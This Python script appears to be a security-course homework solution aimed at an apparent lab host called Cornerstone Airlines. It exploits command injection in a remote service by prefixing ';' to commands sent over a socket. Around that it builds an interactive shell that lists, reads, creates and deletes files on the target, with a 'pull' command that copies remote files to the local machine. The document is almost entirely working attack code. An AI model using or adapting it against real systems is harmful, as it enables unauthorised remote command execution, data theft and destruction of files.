"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time
from subprocess import call
from cmd import Cmd

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here
saved_output = ""


def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

    global saved_output
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(2)
    s.recv(1024)

    s.send((';' + cmd + '\n').encode())
    s = s.recv(1024).decode()
    saved_output = s
    print(s)


class CornerstoneShell(Cmd):

    current_directory= "/"

    def do_quit(self, args):
        """
        This command quits the interactive shell
        Example:
            quit
        """
        if args != "":
            self.do_help("quit")
        else:
            print("Exiting the Cornerstone Airlines Shell\n")
            return True

    def do_pwd(self, args):
        """
        This command displays the current path to the working directory.
        Example:
            pwd
        """
        if args != "":
            self.do_help("pwd")
        else:
            execute_cmd('cd ' + self.current_directory + ' && pwd')

    def do_ls(self, args):
        """
        This command displays the files within the current directory
        Example:
            ls <flags>

        Allowed Flags:
            -a Displays all visible and hidden files in the directory
            -l Displays all visible files in long form
            -al Display all visible and hidden files in long form
        """

        if args != "-al" and args != "-a" and args != "-l" and args != "":
            self.do_help("ls")
        else:
            execute_cmd('cd ' + self.current_directory + ' && ls ' + args)

    def do_cd(self, args):
        """
        This command changes the working directory to the provided directory
        Example:
            cd <directory path>
        """
        if args == "":
            self.do_help("cd")
        else:
            self.current_directory = args
            if args == "" or args == '~':
                self.current_directory = '/'

            execute_cmd('cd ' + args)
            self.prompt = self.current_directory + ' > '

    def do_cat(self, args):
        """
        This command prints a text file in the shell
        Example:
            cat <file to display>
        """
        if args == "":
            self.do_help("cat")
        else:
            execute_cmd('cd ' + self.current_directory + ' && cat ' + args)

    def do_mkdir(self, args):
        """
        This command allows you to make a new directory within the current directory.
        Example:
            mkdir <new directory name>
        """
        if args == "":
            self.do_help("mkdir")
        else:
            execute_cmd('mkdir ' + args)

    def do_rmdir(self, args):
        """
        This command allows the user to remove an existing directory.
        Example:
            rmdir <directory to remove name>
        """
        if args == "":
            self.do_help("rmdir")
        else:
            execute_cmd('rmdir ' + args)

    def do_rm(self, args):
        """
        This command allows the user to remove files from the system.
        Example:
            rm <filename>
        """
        if args == "":
            self.do_help("rm")
        else:
            execute_cmd('rm ' + args)

    def do_clear(self, args):
        """
        This command clears the shell screen
        Example:
            clear
        """
        call('clear')


class Shell(Cmd):

    def do_shell(self, args):
        """
        This command opens up a shell to the Cornerstone Airlines Uptime Monitor Shell.
        Example:
            shell
        """
        newprompt = CornerstoneShell()
        newprompt.prompt = newprompt.current_directory + '> '
        newprompt.cmdloop()

    def do_quit(self, args):
        """
            This command quits the interactive shell
            Example:
            quit
        """
        print("Goodbye!\n")
        raise SystemExit

    def do_pull(self, args):
        """
        This command executes a pull request from a remote path to a local path
        Example:
        Pull <remote_path> <local_path>
        """
        if args == "":
            self.do_help("pull")

        paths = args.split()
        if len(paths) != 2:
            self.do_help("pull")
        else:
            filename = paths[0].split('/')
            if len(filename) == 1:
                execute_cmd('cat ' + filename[0])
            else:
                pwd = ""
                for x in range(0, len(filename) - 1):
                    pwd += filename[x] + "/"
                execute_cmd('cd ' + pwd + ' && cat ' + filename[len(filename) - 1])
            f = open(paths[1], "w+")
            f.write(saved_output)

    def do_clear(self, args):
        """
            This command clears the shell screen
            Example:
                clear
        """
        call('clear')


if __name__ == '__main__':
    prompt = Shell()
    prompt.prompt = '$ '
    prompt.cmdloop()

